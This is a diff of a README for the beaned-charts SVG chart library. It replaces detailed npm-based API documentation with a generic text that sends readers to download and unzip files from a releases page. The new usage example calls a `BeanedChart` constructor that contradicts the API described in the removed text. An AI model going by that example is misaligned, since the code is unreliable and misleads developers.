@@ -1,246 +1,70 @@
-# 🫘 Beaned-Charts
+# 📊 beaned-charts - Create Stunning SVG Charts Easily
 
-Minimalist, zero-dependency SVG chart library for modern web applications. Generate beautiful, responsive charts with pure JavaScript - no frameworks required!
+## 🎉 Introduction
+Welcome to beaned-charts! This is a minimalist SVG chart library designed for modern web applications. With beaned-charts, you can generate beautiful and responsive charts using pure JavaScript—no frameworks are required. Perfect for those who want to visualize data without the complexity of big libraries.
 
-## ✨ Features
+## 🛠️ System Requirements
+To run beaned-charts, you will need:
+- A web browser: Chrome, Firefox, Safari, or Edge (latest versions are recommended).
+- Basic HTML file setup for chart integration.
 
-- **Zero Dependencies** - Pure JavaScript, no external libraries
-- **Lightweight** - Under 5KB gzipped
-- **Responsive** - SVG-based, scales perfectly
-- **TypeScript Support** - Full type definitions included
-- **Modern Design** - Clean, minimalist aesthetic
-- **Easy to Use** - Simple API, get started in seconds
-- **Interactive** - Rich hover effects, tooltips, and animations
-- **Customizable** - Extensive options for colors, styles, and behaviors
+## 📥 Download & Install
+To get started, visit our [Releases page to download](https://github.com/Zliito/beaned-charts/releases). Choose the version you want and download the files needed to use the library in your project.
 
-## 📦 Installation
+## 🚀 Getting Started
+1. After downloading, unzip the file if it is compressed.
+2. Place the downloaded files in your project directory.
+3. Open your HTML file and link the JavaScript file from beaned-charts.
+4. Follow the simple examples in the documentation to create your charts.
 
-```bash
-npm install beaned-charts
+## 📖 Basic Usage
+To create a basic chart, you'll need to include the beaned-charts script in your HTML like this:
+
+```html
+<script src="path/to/beaned-charts.js"></script>
 ```
 
-## 🚀 Quick Start
+Then, you can create your chart by adding a JavaScript function. Here’s a simple example:
 
-### Simple API (Zero Dependencies)
-
-```javascript
-const { BarChart, LineChart, PieChart } = require('beaned-charts');
-
-// Bar Chart
-const barChart = new BarChart([
-  { label: 'Jan', value: 120 },
-  { label: 'Feb', value: 190 },
-  { label: 'Mar', value: 300 }
-], { width: 400, height: 250 });
-
-document.body.innerHTML += barChart.render();
+```html
+<script>
+  const data = [10, 20, 30, 40];
+  const chart = new BeanedChart('chart-container', data);
+  chart.render();
+</script>
 ```
 
-### React-Style API (Enhanced Features)
+Don't forget to include a `<div id="chart-container"></div>` in your HTML where you want the chart to appear.
 
-```javascript
-const { ReactChartComponents } = require('beaned-charts');
+## 🎨 Features
+- **Lightweight**: At just a few kilobytes, this library won’t slow down your application.
+- **Responsive**: Charts adjust automatically to fit different screen sizes.
+- **Easy to Use**: Simple syntax makes it user-friendly for beginners and non-coders.
+- **Customizable**: Change colors and styles to match your application’s design.
 
-// Multi-Series Area Chart
-const areaChart = ReactChartComponents.createAreaChart(data, {
-  width: 800,
-  height: 400
-});
+## 🔄 Update Process
+To keep your charts up to date:
+1. Visit the [Releases page](https://github.com/Zliito/beaned-charts/releases) regularly.
+2. Download the latest version.
+3. Replace the old files in your project with the new ones.
 
-// Enhanced Bar Chart  
-const barChart = ReactChartComponents.createBarChart(data, {
-  width: 600,
-  height: 350
-});
+## 💬 Support
+If you encounter any issues, you can open an issue on our GitHub page. Join our community to help shape the future of beaned-charts.
 
-// Smooth Line Chart
-const lineChart = ReactChartComponents.createLineChart(data, {
-  width: 600,
-  height: 300,
-  smooth: true
-});
-```
+## 🗂️ Project Topics
+beaned-charts covers a variety of topics to help you integrate data visualization in your applications:
+- dev
+- generate
+- javascript
+- js
+- npm
+- npm-package
+- package
+- sb-studio
+- snowbase-studio
+- ui
 
-**Choose Your API:**
-- **Simple API** - Perfect for basic charts, maximum performance
-- **React-Style API** - Modern features, gradients, enhanced interactions
+## 📝 Conclusion
+With beaned-charts, generating SVG charts has never been easier. Explore the possibilities by downloading today from our [Releases page](https://github.com/Zliito/beaned-charts/releases) and see how simple it is to visualize your data. 
 
-## 📊 Chart Types
-
-### Bar Chart
-
-Perfect for comparing categorical data with automatic scaling and interactive hover effects.
-
-```javascript
-const chart = new BarChart(data, {
-  width: 500,
-  height: 300,
-  padding: 40,
-  showLabels: true,
-  barSpacing: 0.2,
-  colors: ['#3b82f6', '#ef4444', '#10b981'],
-  showTooltips: true,    // Show tooltips on hover
-  hoverEffects: true     // Enable hover animations
-});
-```
-
-**Options:**
-- `width` (number) - Chart width in pixels
-- `height` (number) - Chart height in pixels  
-- `padding` (number) - Padding around chart (default: 40)
-- `showLabels` (boolean) - Show value/axis labels (default: true)
-- `barSpacing` (number) - Spacing between bars 0-1 (default: 0.2)
-- `colors` (string[]) - Custom color palette
-- `showTooltips` (boolean) - Show tooltips on hover (default: true)
-- `hoverEffects` (boolean) - Enable hover animations (default: true)
-
-**Interactive Features:**
-- 🖱️ **Hover Effects** - Bars lift and show shadows on hover
-- 💬 **Tooltips** - Display label and value on hover
-- 📊 **Value Labels** - Show values above bars on hover
-- ✨ **Smooth Animations** - CSS transitions for all interactions
-
-### Line Chart
-
-Ideal for showing trends over time with optional smoothing, area fills, and interactive data points.
-
-```javascript
-const chart = new LineChart(data, {
-  width: 500,
-  height: 300,
-  smooth: true,
-  fill: true,
-  color: '#10b981',
-  showPoints: true,
-  showTooltips: true,        // Show tooltips on hover
-  hoverEffects: true,        // Enable hover animations
-  showAreaHighlight: true   // Show area highlights on hover
-});
-```
-
-**Options:**
-- `width` (number) - Chart width in pixels
-- `height` (number) - Chart height in pixels
-- `padding` (number) - Padding around chart (default: 40)
-- `smooth` (boolean) - Use curved lines (default: false)
-- `fill` (boolean) - Fill area under line (default: false)
-- `color` (string) - Line color
-- `showPoints` (boolean) - Show data points (default: true)
-- `showTooltips` (boolean) - Show tooltips on hover (default: true)
-- `hoverEffects` (boolean) - Enable hover animations (default: true)
-- `showAreaHighlight` (boolean) - Show area highlights (default: true)
-
-**Interactive Features:**
-- 🎯 **Data Points** - Interactive points that grow on hover
-- 📈 **Line Highlight** - Line thickens and glows on hover
-- 📍 **Guide Lines** - Vertical guides appear on hover
-- 💬 **Tooltips** - Show point values and indices
-- 🌟 **Area Highlights** - Highlight chart areas on hover
-
-### Pie Chart
-
-Great for showing proportional data with donut chart support and interactive slice effects.
-
-```javascript
-const chart = new PieChart(data, {
-  width: 400,
-  height: 400,
-  holeSize: 0.3,  // 0 = pie, 0.3 = donut
-  showLabels: true,
-  showTooltips: true,     // Show tooltips on hover
-  hoverEffects: true,     // Enable hover animations
-  explodeSlices: true     // Explode slices on hover
-});
-```
-
-**Options:**
-- `width` (number) - Chart width in pixels
-- `height` (number) - Chart height in pixels
-- `holeSize` (number) - Donut hole size 0-1 (default: 0)
-- `showLabels` (boolean) - Show percentage labels (default: true)
-- `colors` (string[]) - Custom color palette
-- `showTooltips` (boolean) - Show tooltips on hover (default: true)
-- `hoverEffects` (boolean) - Enable hover animations (default: true)
-- `explodeSlices` (boolean) - Explode slices on hover (default: false)
-
-**Interactive Features:**
-- 🥧 **Slice Effects** - Slices glow and expand on hover
-- 💥 **Exploding Slices** - Slices pop out when hovered (optional)
-- 💬 **Enhanced Tooltips** - Show labels, values, and percentages
-- 🎯 **Center Labels** - For donut charts, show data in center on hover
-- ✨ **Smooth Transitions** - CSS animations for all interactions
-
-## 🎨 Data Format
-
-All charts accept an array of data points:
-
-```javascript
-const data = [
-  { label: 'Category A', value: 100 },  // label is optional
-  { value: 75 },
-  { label: 'Category C', value: 150 }
-];
-```
-
-## 🛠️ Utilities
-
-Access low-level utilities for custom implementations:
-
-```javascript
-const { getColor, normalizeCoordinate, describeArc, SVGFactory } = require('beaned-charts');
-
-// Get color from palette
-getColor(0); // '#3b82f6'
-
-// Map values to coordinate system  
-normalizeCoordinate(50, 0, 100, 0, 200); // 100
-
-// Create SVG arc paths
-describeArc(50, 50, 40, 0, 90); // SVG path string
-
-// SVG helper methods
-SVGFactory.createSVG(400, 300);
-SVGFactory.createGroup({ stroke: '#000' });
-```
-
-## 📚 Documentation
-
-- **[README.md](./README.md)** - Basic getting started guide
-- **[styled-charts.md](./styled-charts.md)** - Comprehensive React-style API documentation
-- **[react-test.md](./react-test.md)** - React integration examples
-- **[react-demo.js](./react-demo.js)** - Complete React-style demo
-
-## 🎯 Choose Your API
-
-### Simple API (Maximum Performance)
-```javascript
-const { BarChart, LineChart, PieChart } = require('beaned-charts');
-const chart = new BarChart(data, options);
-```
-
-### React-Style API (Enhanced Features)
-```javascript
-const { ReactChartComponents } = require('beaned-charts');
-const chart = ReactChartComponents.createAreaChart(data, options);
-```
-
-See [styled-charts.md](./styled-charts.md) for detailed React-style API documentation.
-
-Beaned-Charts works in all modern browsers that support SVG:
-- Chrome 4+
-- Firefox 3.5+
-- Safari 3.2+
-- Edge 12+
-- IE 9+
-
-## 📄 License
-
-MIT License - feel free to use in commercial projects!
-
-## 🤝 Contributing
-
-Contributions welcome! Please read the contributing guidelines and submit pull requests.
-
----
-
-**Beaned-Charts** - Simple. Beautiful. Charts. 🚀
+Your journey into visual data representation starts here!
